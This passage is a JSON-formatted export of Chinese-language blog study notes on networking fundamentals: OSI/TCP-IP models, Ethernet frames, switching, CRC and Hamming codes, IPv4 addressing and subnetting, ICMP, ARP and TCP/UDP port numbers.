0/0/0"},{"title":"","date":"2023-12-03T05:59:00.000Z","updated":"2023-12-03T05:59:00.000Z","comments":true,"path":"notes/datacom/3.html","permalink":"https://blog.mhuig.top/notes/datacom/3","excerpt":"","text":"网络参考模型 网络参考模型 网络标准为什么制定网络标准: 20 世纪 60 年代, 计算机网络得到了飞速发展. 各大厂商和标准组织为了在数据通信领域占据主导地位, 纷纷推出了各自的网络架构体系和标准, 同时各大厂商根据这些标准生产不同的硬件和软件. 标准组织和厂商共同努力, 促进网络技术的快速发展. ISO(国际标准化组织): 在 1984 年提出了 OSI RM (开放系统互联参考模型) OSI 七层模型 应用层 APDU(PDU, 协议数据单元): 对应用程序提供接口, 使用户的数据入录或输出, 最接近用户的一层. 表示层 PPDU: 对数据格式转换, 可以对数据提供加密、解密、压缩和解压缩的操作. 会话层 SPDU: 在通信双方建立管理和终止会话. 传输层 Sgement(数据段): 维护端到端的连接, 流量控制. 网络层 Packet(数据包): 定义了逻辑地址实现了数据从源到目的的转发. 数据链路层 Frame(数据帧): 将数据封装成帧, 适应链路层地址在数据链路层上实现数据通信的寻址, 差错检测. 物理层 Bit(比特流): 规定设备间传输 bit 流, 规定传输介质、电平、速率和针脚等物理特性. 七层模型优点: 将服务, 接口和协议三个概念明确区分开, 理论比较完整, 通过七个层次化的结构使不同的系统之间实现可靠通信. 缺点: 过于理想化, 现实的生产环境比较少能用上, 既复杂又不实用, 运行效率低, 划分不合理. TCP / IP 标准模型应用层: 将 OSI 的上三层合并. 传输层: 不变. 因特网层: 重命名. 网络接入层: 将下两层合并. TCP / IP 对等模型应用层: 将 OSI 的上三层合并. 传输层 网络层 数据链路层 物理层"},{"title":"","date":"2023-12-05T01:30:00.000Z","updated":"2023-12-05T01:30:00.000Z","comments":true,"path":"notes/datacom/5.html","permalink":"https://blog.mhuig.top/notes/datacom/5","excerpt":"","text":"交换网络基础 交换网络基础 交换网络交换网络: 由交换机所构成的网络. 交换机: 工作在二层的全双工设备, 能够处理数据帧并且能够根据数据帧的头部进行数据的转发, 通过设备之间的唯一信道转发解决了冲突问题. 交换机的转发行为: 泛洪: 从某一接口接收的数据帧, 从除了收到数据帧的接口以外, 所有接口全部发送该数据帧. 当数据帧的目的 MAC 为广播 MAC 时. 当 MAC 地址表中没有数据帧中的 MAC 地址信息时. 转发: 从某一接口接收了数据帧, 从另一个接口发送. 当发送的数据帧目的 MAC 地址为单播 MAC 地址并且 MAC 地址表中有目的 MAC 地址与接口的映射关系. 丢弃: 从某一接口接收了数据帧, 要从该接口发送则丢弃. MAC 地址表MAC 地址表: 交换机的转发依据, 默认状态下, 交换机的 MAC 地址表为空. MAC 接口 F0-03-8C-XX-XX-XX G0/0/1 学习MAC 地址表的学习: 当交换机从某一个接口收到数据帧时, 会将数据帧中的源 MAC 地址和接收该数据帧的端口记录到 MAC 地址表中. MAC 地址表中不会出现组播 MAC 和广播 MAC. 如果交换机的接口上接了一个 HUB 集线器, HUB 接两个 PC, MAC 地址表会学习一个接口上的两个 MAC 地址, 两条信息. 如果一个 PC 上接了一个 HUB 集线器, HUB 接两个交换机接口, 会产生冲突域, MAC 地址表不会在两个接口发现同一个 MAC 地址. 一个端口下可以学习多个 MAC 地址, 但一个 MAC 地址只能对应一个端口. 老化MAC 地址表的老化: 在计时器范围内没有再次收到数据帧刷新 MAC 地址表项, 则交换机会删除对应的表项. 老化时间: 300s 如果接收的数据帧的端口和记录的端口不同, 则会迅速老化原来的表项, 生成新的表项. 刷新交换机 MAC 地址表刷新: 当交换机已经存在 MAC 地址时, 再次收到数据帧, 则会刷新 MAC 地址表的计时器."},{"title":"","date":"2023-12-04T02:02:00.000Z","updated":"2023-12-04T02:02:00.000Z","comments":true,"path":"notes/datacom/4.html","permalink":"https://blog.mhuig.top/notes/datacom/4","excerpt":"","text":"以太网帧结构 以太网帧结构 协议一套约定俗成的特殊形式, 是设备与设备之间的语言, 固定格式化信息, 所有的设备根据协议的字段来理解报文的作用. 以太网协议分类： IEEE 802.3：一般应用于以太网的控制协议信息. 例如 STP 协议使用的是 802.3 的数据帧. Eternet_II：是目前以太网数据使用最多的帧格式. 以太网 MAC 地址F0-03-8C-XX-XX-XX MAC 地址: 一台物理设备唯一且不可更改的标识信息, 以十六进制表示的. OUI (厂商标识符): 前 24bit, 由 IEEE 管理和分配. RFC 7042 厂商自定义标识: 后 24bit, 由厂商自己分配. 单播 MAC 地址: 当第 8bit 为 0 时, 该地址为单播 MAC 地址. 当十六进制第二位为偶数时第八 bit 一定为 0. 组播 MAC 地址: 当第 8bit 为 1 时, 该地址为组播 MAC 地址. 组播 MAC 地址不能用作 源 MAC 地址, 不能给设备使用. 广播 MAC 地址: 当 48bit 全为 1 时, 该地址为广播 MAC 地址. 只有单播 MAC 地址可以作为设备的 MAC 地址使用, 作为源地址使用. 以太网帧格式 (Eternet_II) D.MAC (destination.MAC): 目的 MAC 地址 6 字节. S.MAC (source.MAC): 源 MAC 地址 6 字节. TYPE: 类型, 标识上层协议类型, 2 字节. 0x0800: IP 协议 0x0806: ARP 协议 DATA: 数据载荷 可变长度 46 字节 - 1500 字节. FCS(Frame Check Sequence): 帧校验序列, 判定数据帧在传递过程中的完整性 4 字节. 通信方式单播: 数据从某一台设备单独发送给另一台设备其他设备并接收处理. 组播: 数据发向某一个特定的分组, 只有在组内的设备才能够监听处理, 没有监听该组的设备无法收到数据. 广播: 数据发向广播地址, 该数据会被网络中所有的设备接收处理 数据帧的发送和接收发送端数据由发送端进行封装, 在数据封装成帧时, 会在数据帧的头部添加目的 MAC 和源 MAC, 将上层的封装协议在 TYPE 字段标明, 随后对数据帧进行计算将得出的值放置在 FCS 字段中, 随后发送出去. 接收端接收一个数据帧时, 首先核对帧校验, 以确保数据完整性, 在 FCS 通过后, 查看目的 MAC 地址, 当目的 MAC 地址与接收方 MAC 地址一致时, 或广播地址或自身所监听的组播 MAC 地址时, 才会处理该数据帧, 否则丢弃, 确认是自身所要处理的数据帧后, 会根据 TYPE 字段来确定后续的处理协议. 透明传输指不管所传数据时什么样的比特组合, 都应当能够在链路上传送. 因此, 链路层就 \"看不见\" 有什么妨碍数据传输的东西. 当所传数据中的比特组合恰巧与某一个控制信息完全一样时, 就必须采取适当的措施, 使收方不会将这样的数据误认为是某种控制信息. 这样才能保证数据链路层的传输是透明的. 透明传输是指在数据通信中，传输过程对用户或应用程序是不可见的，即无需用户或应用程序的干预或感知，数据可以自动、无缝地从发送端传输到接收端。在透明传输中，用户或应用程序无需关心底层的通信细节和协议，只需使用高层的接口或 API 来发送和接收数据。 透明传输的目标是提供简化和方便的数据传输体验，使用户能够专注于数据的使用和处理，而无需了解底层的传输机制。透明传输可以在不同的通信网络和协议中实现，包括局域网、广域网、互联网等。 字符计数法帧首部使用一个计数字段 (第一个字节, 8 位) 来标明帧内字符数 由于 count 字段的脆弱性, 容易出错, 不常用. 字符填充法SOH 00000001 帧开始符 （Start of Header） EOT 00000100 帧结束符 （End of Transmission） 非 ASCII 采用字符填充法实现透明传输 ESC EOT 填充转义字符 (ESC) 实现复杂和不兼容性, 不常用. eg. PPP 字节填充 RFC 1662 零比特填充法01111110 ......... 01111110 发送端, 扫描整个信息字段, 只要有连续 5 个连续 1 就立即填入 1 个 0. 接收端, 收到一个帧时, 先找到标志字段确定边界, 再用硬件对比特流进行扫描, 发现连续 5 个 1 就把后面的 0 删掉. 保证了透明传输: 在传送的比特流中可以传送任意比特组合, 而不引起对帧边界的判断错误. 违规编码法曼切斯特编码 \"高 - 低\",\"低 - 高\" 用 \"高 - 高\",\"低 - 低\" 来定界帧的起始和终止 普遍使用的帧同步法是 比特填充法和违规编码法. 差错控制差错从何而来 线路本身电气特性产生的随机噪声, 信道固有, 随机存在 (提高信噪比减少或避免干扰) 外界特定的短暂原因造成的冲击噪声是产生差错的主要原因 (利用编码技术来解决) 位错 (bit 位出错 0 变 1 1 变 0)帧错 (丢失, 重复, 失序) 检错编码 - 奇偶校验码奇校验码: \"1\" 的个数为奇数偶校验码: \"1\" 的个数为偶数 只能检查出奇数个比特错误, 检错能力为 50%. 检错编码 - CRC 循环冗余码要传的数据 生成多项式 FCS 帧检验序列 / 冗余码 5 / 2 ..... 1 最终发送数据 5 + 1=6 接收的数据 生成多项式 6 / 2 ..... 0 余数为 0, 判定无错, 接受 准备待传有效数据 分组 d d d d d d 每个组都加上冗余码构成帧再发送 d 位 + r 位 FCS 双方商定的除数 / 生成多项式 r + 1 位 1101 FCS 帧检验序列计算方式: 模二 A.K.A 异或 (同 0 异 1) d 位 + r 位 0 / 生成多项式 = 商 ..... r 位 FCS 例子要发送的数据 1101 0110 11 CRC 校验 生成多项式 10011 加 0 生成多项式的阶为 r, 则加 r 个 0 (多项式 r 位阶为 r-1) 10011 生成多项式 阶为 4 模 2 除法 数据加 0 后除以多项式, 余数为冗余码/FCS/CRC 校验码的比特序列 1101 0110 11 0000 / 10011 余数 1110 最终发送数据 1101 0110 11 1110 接收端检错过程 把收到的每一个帧都除以同样的除数, 然后检查得到余数 R. 余数为 0, 判定帧没有差错, 接受. 余数不为 0, 判定帧有差错, 丢弃. FCS 的生成以及接收端的 CRC 检验都是由硬件实现, 处理迅速, 因此不会延误数据的传输. 链路层使用 CRC 检验能够实现无差错比特传输, 不能实现可靠传输 纠错码 - 海明码 确定校验码位数 r 确定校验码和数据的位置 求出校验码值 检错并纠错 海明距离两个合法编码 (码字) 的对应比特取值不同的比特数称为这两个码字的海明距离 (码距),一个有效编码集中, 任意两个合法编码 (码字) 的海明距离的最小值称为该编码集的海明距离 (码距). 1. 确定校验码位数 r数据/信息有 m 位, 冗余码/校验码有 r 位 校验码一共有 种取值 海明不等式 要发送的数据: D = 1100 数据的位数 m = 4满足不等式的最小 r 为 3D = 1100 的海明码应该有 4 + 3=7 位其中原数据 4 位, 校验码 3 位 2. 确定校验码和数据的位置校验码放在序号为 的位置 序号 7 6 5 4 3 2 1值 1 1 0 x_4 0 x_2 x_1 3. 求出校验码值 1** *1* **1二进制 111 110 101 100 011 010 001序号 7 6 5 4 3 2 1值 1 1 0 x_4 0 x_2 x_1 4: 负责 4567 的校验 2: 负责 2367 的校验 1: 负责 1357 的校验 采用偶校验 x_4 = 0 x_2 = 0 x_1 = 1 1** *1* **1二进制 111 110 101 100 011 010 001序号 7 6 5 4 3 2 1值 1 1 0 0 0 0 1 4. 检错并纠错若接收数据 1110001 偶校验 4: 负责 4567 的校验 0111 x 2: 负责 2367 的校验 0011 v 1: 负责 1357 的校验 1011 x 错误位是 5 偶校验 (异或为 0) x_4 异或 0 异或 1 异或 1 异或 1 = 0 x_4 = 1 x_2: 0011 x_2=0 x_1: 1011 x_1=1 x_4 x_2 x_1 1 0 1 101 转十进制为 5 ,错误位是 5 流量控制方法停止等待协议每发送完一个帧就停止发送, 等待对方的确认, 在收到确认后再发送下一个帧 发送窗口大小 = 1 接收窗口大小 = 1 滑动窗口协议发送窗口 接收窗口 后退 N 帧协议 (GBN) 发送窗口大小 &gt; 1 接收窗口大小 = 1 选择重传协议 (SR) 发送窗口大小 &gt; 1 接收窗口大小 &gt; 1 可靠传输: 发送端发啥接收端收啥 流量控制: 控制发送速率, 使接收方有足够缓冲空间接收每一个帧 滑动窗口解决 流量控制和可靠传输."},{"title":"","date":"2023-12-06T01:30:00.000Z","updated":"2023-12-06T01:30:00.000Z","comments":true,"path":"notes/datacom/6.html","permalink":"https://blog.mhuig.top/notes/datacom/6","excerpt":"","text":"IP 编址 IP 编址 IPIP: 网际协议, 网络层协议, 用来为网络中设备分配逻辑地址. 网络层的逻辑地址就是 IP 地址, IP 地址是可以更改的, 当设备在不同网络中, 根据所处网络的不同发生变化, 在同一个网络内必须保证唯一性. 设备有了 IP 地址后, 就可以在网络中进行通信. IP 报文头部RFC 791 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|Version| IHL |Type of Service| Total Length |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Identification |Flags| Fragment Offset |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Time to Live | Protocol | Header Checksum |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Source Address |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Destination Address |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Options | Padding |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Example Internet Datagram Header 基本信息行Version: 版本, 4bit, 用来标明当前 IP 协议的版本, 如果当前报文在 IPv4 时, 则该字段的值为 4(0b0100) IHL: IP 头部长度, 4bit, 范围 20-60 字节, 每个单位代表 4 字节 , 字节 字节 , 字节 字节 字节长度取值一定是四的倍数. DS/TOS: 差分服务域, 服务类别, 8bit, 让特定的数据拥有更高的优先级. Total length: 数据包总长度, 16bit, 用于标识 IP 报文头部加数据载荷的长度, 最大 65535 字节. 分片行[MTU: 最大传输单元, 用于限制报文不被分片的最大字节, 默认情况下 MTU 值为 1500 字节.] ID: 标识, 16bit, 用于顺序 IP 报文, 同一个报文得到的分片信息中的 ID 相同. Flages: 标志位, 3bit. 最高位被保留, 固定为 0. 中间位为 DF 位: 如果置位为 1, 则表示该报文不能被分片. 最低位称为 more 位: 如果置位 1, 则表示后续还有分片报文. 如果报文大于 MTU 值并且 DF 置位, 直接丢弃. Offset: 13bit, 片偏移, 用于标识分片包在原始报文的位置. 片偏移指出: 较长的分组在分片后，某片在原分组中的相对位置。也就是说，相对于用户数据字段的起点，该片从何处开始。片偏移以 8 个字节为偏移单位。这就是说，每个分片的长度一定是 8 字节 (64 位) 的整数倍. 【例】一数据报的总长度为 3820 字节，其数据部分为 3800 字节长 (使用固定自部)，需要分片为长度不超过 1420 字节的数据报片。因固定首部长度为 20 字节，因此每个数据报片的数据部分长度不能超过 1400 字节。于是分为 3 个数据报片，具数据部分的长度分别为 1400 ，1400 和 1000 字节。原始数据报首部被复制为各数据报片的首部，但必须修以有关字段的值。下面给出分片后得出的结果 (请注意片偏移的数值)。 数据报 总长度 标识 MF DF 片偏移 原始数据报 3820 12345 0 0 0(0/8=0) 数据报片 1 1420 12345 1 0 0(0/8=0) 数据报片 2 1420 12345 1 0 175(1400/8=175) 数据报片 3 1020 12345 0 0 350(2800/8=350) 现在假定数据报片 2 经过某个网络时还需要再进行分片，即划分为数据报片 2-1 (携带数据 800 字节) 和数据报片 2-2 (携带数据 600 字节)。那么这两个数据报片的总长度、标识、MF、DF 和片偏移分别为: 820,12345,1,0,175; 620,12345,1,0,275。 功能行TTL: 生存周期, 8bit, 用来在 IP 报文转发过程中, 打破环路对网络的影响, 最大值 255, 会在数据包经过一次第三层转发时减 1. 当值为 0 时数据包被丢弃. Protocol: 8bit, 用于标明网络层处理完 IP 报文后, 需要交给上层的某个协议继续处理. 1: ICMP 6: TCP 17: UDP Header Checksum: 16bit, 首部校验和, 检测 IP 首部是否发生错误. 地址行SIP: 源 IP 地址, 32bit, 表明当前数据包从哪出发. DIP: 目的 IP 地址, 32bit, 表明当前数据包去往何处. 可选项Options: 可选项, 可变长度, 最大 40 字节. 军事或研究方向, 支持松散源路由, 严格源路由等等. IP 地址IP 地址: 用来标识网络中的一个节点或网络设备的接口, 总长度 32bit, 约 42.9 亿 (), 每个 IP 地址都由网络位和主机位组成. 网络位: 用来标明当前设备的网络位置. 主机位: 用来标明当前主机在当前网络中的位置. 网络掩码: 32bit, 由连续的 1 和 0 构成, 其中 1 标记的是网络位, 0 标记的是主机位. 网络地址: 当主机位全都为 0 时, 表示当前网络信息. 广播地址: 当主机位全都为 1 时, 表示当前网络范围内的广播地址. 可用地址: 可分配给网络中的节点或网络设备接口的地址. 一个网络内的可用 IP 地址 , 表示主机位的位数. 网络地址和广播地址不能直接被节点或网络设备所使用. IP 地址分类有类 IP 地址A: 第一个 bit 为 0, 并且掩码长度为 8. (0.0.0.0-127.255.255.255) B: 前两个 bit 为 10, 并且掩码长度为 16. (128.0.0.0-191.255.255.255) C: 前三个 bit 为 110, 并且掩码长度为 24. (192.0.0.0-223.255.255.255) D: 前四个 bit 为 1110, 组播地址. (224.0.0.0-239.255.255.255) E: 前四个 bit 为 1111. (240.0.0.0-255.255.255.255) 按照使用范围分类公有地址: 可以在公网范围内使用的地址. 私有地址: 可以在局域网中使用, 在不同的局域网中可以重复使用, 不能够被公网转发. 私有地址范围: A: 10.0.0.0-10.255.255.255 ; 10.0.0.0/8 B: 172.16.0.0-172.31.255.255 ; 172.16.0.0/12 C: 192.168.0.0-192.168.255.255 ; 192.168.0.0/16 IPv6 私有地址范围: fc00::/7 (ULAs，Unique Local Addresses) 特殊地址这类 IP 地址不能够给设备使用, 并且全部具有特定意义. 0.0.0.0: 当设备初次进入网络时, 会使用该地址. 特定场景下可以代表所有地址. 255.255.255.255: 全网广播地址, 可以向广播域内所有设备发送数据. 127.0.0.0-127.255.255.255: 本地环回测试地址, 检查本地网卡驱动是否正常. 进制转换十进制转二进制短除法 倒着写: 2|192 0 ---- 2|96 0 --- 2|48 0 --- 2|24 0 --- 2|12 0 --- 2|6 0 --- 2|3 1 -- 12|168 0 ---- 2|84 0 --- 2|42 0 --- 2|21 1 --- 2|10 0 --- 2|5 1 --- 2|2 0 -- 1 权重减法: 192-128=6464-64=01100 0000168-128=4040-32=88-8=01010 1000 二进制转十进制 256 128 64 32 16 8 4 2 1 IP 地址计算172.16.10.1/16 这个 B 类地址的网络地址, 广播地址, 可用地址数 IP 地址: 172.16.10.1 10101100 00010000 00001010 00000001 网络掩码: 255.255.0.0 11111111 11111111 00000000 00000000 网络地址: 127.16.0.0 10101100 00010000 00000000 00000000 广播地址: 127.16.255.255 10101100 00010000 11111111 11111111 IP 地址数: 可用 IP 地址数: 可用 IP 地址范围: 172.16.0.1-172.16.255.254 192.168.54.6/24网络地址: 192.168.54.0/24广播地址: 192.168.54.255/24IP地址数: 2^8=256可用IP地址数: 2^8-2=254可用IP地址范围: 192.168.54.1-192.168.54.254172.168.54.6 主类B /16网络地址: 172.168.0.0/16广播地址: 172.168.255.255/16IP地址数: 2^16=65536可用IP地址数: 2^16-2=65534可用IP地址范围: 172.168.0.1/16-172.168.255.254/16172.168.54.6 /22172.168.001101 10.6网络地址: 172.168.52.0/22广播地址: 172.168.55.255/22IP地址数: 2^10=1024可用IP地址数: 2^10-2=1022可用IP地址范围: 172.168.52.1/22-172.168.55.254/22 如果公司有 个人, 适合的掩码长度是 /26 11111111.11111111.11111111.11000000 255.255.255.192 10.1.56.6 /2810.1.56.0000 0110网络地址: 10.1.56.0/28广播地址: 10.1.56.15/28IP地址数: 2^4=16可用IP地址数: 2^4-2=14可用IP地址范围: 10.1.56.1/28-10.1.56.14/28192.172.168.169 /27192.172.168.101 01001网络地址: 192.172.168.160/27广播地址: 192.172.168.191/27IP地址数: 2^5=32可用IP地址数: 2^5-2=30可用IP地址范围: 192.172.168.161/27-192.172.168.190/27192.168.39.48 /19192.168.001 00111.48网络地址: 192.168.32.0/19广播地址: 192.168.63.255/19IP地址数: 2^13=8192可用IP地址数: 2^13-2=8190可用IP地址范围: 192.168.32.1/19-192.168.63.254/19192.168.56.9 /19192.168.001 11000.9网络地址: 192.168.32.0/19广播地址: 192.168.63.255/19IP地址数: 2^13=8192可用IP地址数: 2^13-2=8190可用IP地址范围: 192.168.32.1/19-192.168.63.254/19172.169.1.9 /6101011 00.169.1.9网络地址: 172.0.0.0/6广播地址: 175.255.255.255/6IP地址数: 2^26=67,108,864可用IP地址数: 2^26-2=67,108,862可用IP地址范围: 172.0.0.1/6-175.255.255.254/6 划分子网向主机位借位形成子网. 可变长子网掩码 VLSM [例] 有一个 C 类网络地址 192.168.1.0 / 24 ,使用可变长子网掩码给三个子网分别分配 IP 地址 10 台 8 台 5 台 方法 1: 4 个子网 00 000000 0/2601 000000 64/2610 000000 128/2611 000000 192/26 方法 2: 16 个子网 0000 0000 0001 0000 .... [例] 192.168.1.2 / 24 (主机位 8)共有 25 个地址需求求子网网络号, 掩码. 广播地址, 可划分子网数 2^h-2&gt;=25h&gt;=5 主机位 5n=3可划分2^3=8个子网掩码255.255.255.111 00000255.255.255.224/27子网网络号192.168.1.000 00000 192.168.1.0/27192.168.1.001 00000 192.168.1.32/27192.168.1.010 00000 192.168.1.64/27192.168.1.011 00000 192.168.1.96/27192.168.1.100 00000 192.168.1.128/27192.168.1.101 00000 192.168.1.160/27192.168.1.110 00000 192.168.1.192/27192.168.1.111 00000 192.168.1.224/27广播地址192.168.1.000 11111 /27192.168.1.001 11111 /27192.168.1.010 11111 /27192.168.1.011 11111 /27192.168.1.100 11111 /27192.168.1.101 11111 /27192.168.1.110 11111 /27192.168.1.111 11111 /27 [例] 某公司 4 个部门, 每个部门最多 36 人192.168.10.0 / 24 (主机位 8)划分出合适的网络掩码网络号子网数目 2^h-2&gt;=36h&gt;=6n=2子网数目 2^2=4掩码255.255.255.11 000000255.255.255.192网络号192.168.10.00 000000 192.168.10.0/26192.168.10.01 000000 192.168.10.64/26192.168.10.10 000000 192.168.10.128/26192.168.10.11 000000 192.168.10.192/26 IP 编址一个网络内拥有的 IP 地址数量为 (代表主机位位数). 因为网络号和广播地址不可以配置在设备上, 所以实际可用主机地址数为 . 如果两个 IP 地址的网络位相同, 则这两个地址属于同一个网络, 可以不通过网关设备或路由器直接通信. 如果两个 IP 地址的网络位不同, 则需要借助网关设备和路由器进行通信. 使用默认掩码的就是有类地址. 无类地址就是经过子网划分的 IP 地址. VLSM: 可变长子网掩码. 子网掩码变长, 主机位变少, 就会变少, 主机数目减少, 避免地址浪费. 主机位长度缩减, 网络位就会增加. 一个子网位能分出两个子网 ( 是子网位位数). CIDR: 无类域间路由 (VLSM 逆运算) 子网掩码除了 VLSM 以外, 还可以变短进行网络信息的汇总, 这种操作方式就是 CIDR. 将不同网络的网络号中共同发生变化的位置当作主机位进行处理, 之后对外发布, 起到节省设备资源的作用."},{"title":"","date":"2023-12-12T07:45:00.000Z","updated":"2023-12-12T07:45:00.000Z","comments":true,"path":"notes/datacom/7.html","permalink":"https://blog.mhuig.top/notes/datacom/7","excerpt":"","text":"ICMP 协议 ICMP 协议 ICMPRFC 792 ICMP: 网络控制消息协议, 协议号 1, 是一个网络层协议. 用于在网络中传递差错和控制消息的协议. ICMP 报文格式 TYPE: 类型, 8bit, 表示 ICMP 消息类型. Code: 值, 8bit, 表示消息类型中的不同信息. Checksum: 校验和, 16bit, (只校验 ICMP 数据包). Ethernet_II Header Type=0x0800 IP IP Header Protocol=1 ICMP 差错检测ICMP Echo Request (ICMP 请求消息) Type 8 Code 0 ICMP Echo Reply (ICMP 回应消息) Type 0 Code 0 使用 ICMP 协议设备会发送一个 ICMP Echo Request 消息, 当对方设备收到该消息时, 会回应一个 ICMP Echo Reply 消息, 只要发送请求消息的设备收到了对应的 ICMP Echo Reply, 则认为网络可以通信. ICMP 消息类型和编码类型 不可达消息类型 Type = 3 code = 0 网络不可达 Type = 3 code = 1 主机不可达 Type = 3 code = 2 协议不可达 Type = 3 code = 3 端口不可达 ping 应用&gt;ping 192.168.1.6正在 Ping 192.168.1.6 具有 32 字节的数据:来自 192.168.1.6 的回复: 字节=32 时间=82ms TTL=248来自 192.168.1.6 的回复: 字节=32 时间=49ms TTL=248来自 192.168.1.6 的回复: 字节=32 时间=48ms TTL=248来自 192.168.1.6 的回复: 字节=32 时间=283ms TTL=248192.168.1.6 的 Ping 统计信息: 数据包: 已发送 = 4, 已接收 = 4, 丢失 = 0 (0% 丢失), 往返行程的估计时间(以毫秒为单位): 最短 = 48ms, 最长 = 283ms, 平均 = 115ms ICMP 重定向数据包控制 ICMP 重定向是 ICMP 控制报文的一种, 当网关设备从接口收到用户数据后, 如果数据的出口与入接口相同, 则网关设备会向用户发送一个 ICMP 重定向报文, 用于通知用户将目的地址下一跳直接设置为最优路径, 从而优化用户数据转发. 然而, 需要注意的是, 由于安全性和潜在的攻击风险, 许多网络管理员会禁用或限制 ICMP 重定向消息的传输. 这是因为恶意用户可能利用 ICMP 重定向来欺骗主机, 导致数据包被发送到错误的路径上. Tracert 应用&gt;tracert baidu.com通过最多 30 个跃点跟踪到 baidu.com [11x.xx.xx.66] 的路由: 1 6 ms 4 ms 2 ms H3C [192.168.20.1] 2 * * * 请求超时。 3 27 ms 3 ms 28 ms 22x.xx.xx.1 4 6 ms 9 ms 33 ms 11x.xx.xx.5 5 * * * 请求超时。 6 25 ms * 21 ms 22x.xx.xx.229 7 * * * 请求超时。 8 23 ms 28 ms * 22x.xx.xx.62 9 26 ms * * 21x.xx.xx.189 10 30 ms 26 ms * 21x.xx.xx.170 11 52 ms 34 ms 50 ms 11x.xx.xx.162 12 124 ms 45 ms 37 ms 22x.xx.xx.134 13 * * * 请求超时。 14 * * * 请求超时。 15 * * * 请求超时。 16 * * * 请求超时。 17 27 ms 26 ms 31 ms 11x.xx.xx.66跟踪完成。 Tracert: 路径追踪, 基于 ICMP 的另一种工具, 可以显示报文到达目的地的路径, 检测网络丢包以及时延的有效手段, 同时可以帮助管理员发现网络中的环路. 基于 IP 报文头中的 TTL 字段来逐跳追踪报文的转发路径, 并且返回数据报文达到目的主机的路径详细信息, 显示每个路径所消耗的时间. 工作原理 源端设备将 TTL 值设置为 1, 该报文到达第一个节点后, TTL 超时, 于是该节点向源端点发送一个 TTL 超时消息, 该消息携带了该设备的 IP 地址和到达该设备使用的时间. 源端设备将 TTL 值设置为 2, 该报文到达第二个节点后, TTL 超时, 于是该节点向源端点发送一个 TTL 超时消息, 该消息携带了该设备的 IP 地址和到达该设备使用的时间. 反复此过程, 直到报文到达目的地. 最后一个设备 应用层发数据时将 UDP 设置特别大目的端口值 到达目的地返回端口不可达."},{"title":"","date":"2023-12-13T02:24:00.000Z","updated":"2023-12-13T02:24:00.000Z","comments":true,"path":"notes/datacom/8.html","permalink":"https://blog.mhuig.top/notes/datacom/8","excerpt":"","text":"ARP 协议 ARP 协议 ARPARP: 地址解析协议, 用于已知一台设备 IP 地址时, 获取对方的硬件地址信息, 从而进行数据链路层的封装. ARP 协议本身没有一个独立的协议号. 网络层协议. 数据发送之前发送数据帧, 要有源目 MAC 地址. RFC 826 ARP 报文格式 Hardware Type: 硬件地址类型, 以太网, 值为 1. Protocol Type: 协议地址类型, IP 协议, 值为 0x0800. Hardware length: MAC 地址长度, 单位是字节, 值为 6. Protocol length: IP 地址长度, 单位是字节, 值为 4. Operation code: 表示 ARP 报文的类型. ARP Request: 值为 1. ARP Reply: 值为 2. Source hardware address: 源 MAC 地址. Source protocol address: 源 IP 地址. Destination hardware address: 目的 MAC 地址. Destination protocol address: 目的 IP 地址. Eternet_II Header 0x0806: ARP 协议 ARP 缓存表ARP 缓存表: 用来存放 IP 地址以及 MAC 地址的对应关系. 华为设备 ARP 缓存表老化时间 1200s (20min) PC&gt;arp -aInternet Address Physical Address Type ARP 工作过程ARP 请求: 源主机的 ARP 缓存表中不存在目的主机的 MAC 地址, 此时源主机会发送 ARP Request 报文来请求目的主机的 MAC 地址, 此数据帧中的目的 MAC 地址字段为广播. ARP 响应: 跟源主机处于同一个广播域的同一个设备都会收到广播形式的 ARP Request 报文, 收到报文后, 会查看 ARP 报文头部中的目的 IP 和自己是否一致. 如果相同, 则目的主机会将 ARP Request 报文中的源 IP 地址和源 MAC 地址记录到自己的 ARP 缓存表中, 并通过 ARP Reply 响应. 如果不同, 记录 ARP 表项后, 丢弃请求报文. 当源主机收到目的主机发来的 ARP Reply 报文后, 会检查数据帧中的目的 MAC 和 ARP 中的 IP 地址是否为自己的 IP 地址和 MAC 地址, 如果相同, 源主机会将报文中的源 IP 地址和源 MAC 地址记录到自己的缓存表中. 免费 ARP设备刚接入网络时 (刚拥有 IP 地址) 发送免费 ARP (无故 ARP). 用于检测 IP 地址冲突, 主机主动使用自己的 IP 地址作为 ARP 中的目的 IP 地址使用, 发送请求, 正常情况下不会收到 ARP 响应, 如果收到则表明网络中存在与自身 IP 地址重复的设备. ARP 代理同一网段, 不同物理网络上的计算机之间, 可以通过 ARP 代理实现相互通信. 实现第一跳冗余. ARP 欺骗, 存在安全问题, 现在基本不用. ARP 常存在于以太网, 存在局限性. VRRP"},{"title":"","date":"2023-12-13T05:54:00.000Z","updated":"2023-12-13T05:54:00.000Z","comments":true,"path":"notes/datacom/9.html","permalink":"https://blog.mhuig.top/notes/datacom/9","excerpt":"","text":"传输层协议 传输层协议 什么是端到端端到端是网络连接. 网络要通信, 必须建立连接, 不管多远, 中间有多少设备, 都必须在源和目的之间建立连接. 端到端是逻辑连接, 这条路可能经过了很复杂的物理线路, 但两端的设备不管, 只认为两端有连接. TCP 端口号端口号: 用于区分不同的网络服务. 端口号范围: 0-65535. 知名端口号: 0-1023, 即众所周知的端口号. 注册端口号: 1024-49151, 公司和其他用户向 ICANN 机构登记的端口号. 动态端口号 (私有端口号): 49152-65535, 普通用户或随机生成时使用的端口号. 基于 TCP 工作的应用层协议和端口: FTP (文件传输协议): 20,21 SSH (安全加密远程登陆协议) : 22 Telnet (远程登陆协议): 23 SMTP (简单邮件传输协议): 25 DNS (域名解析系统): 53 基于 TCP / UDP HTTP (超文本传输协议): 80 HTTPS (加密超文本传输协议): 443 